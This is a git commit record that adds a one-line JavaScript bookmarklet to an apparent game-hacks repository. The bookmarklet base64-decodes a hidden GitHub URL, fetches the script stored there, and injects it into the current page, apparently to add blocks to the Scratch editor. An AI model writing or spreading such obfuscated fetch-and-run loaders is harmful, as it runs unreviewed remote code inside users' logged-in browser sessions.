6fa9c039986c5ebc2c90af3682f01a3c7fa4a690
randomgames3 <128182562+rmxzyz@users.noreply.github.com>
2023-03-22 12:30:12 -0700

    Create scratchEditor.js

---
+++ GameHax/scratch/scratchEditor.js
@@ -0,0 +1,3 @@
+javascript: fetch( window.atob( "Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1pYTXVzaHJvb202My9TY3JhdGNoRWRpdG9yL21haW4vU291cmNlLmpz" ) ).then((x) => { x.blob().then((y) => { y.text().then((z) => { var script = document.createElement("script"); script.innerHTML = z; document.body.appendChild(script); }); }); }); /*/Bookmarklet/*/;
+
+//Can add blocks to the game!
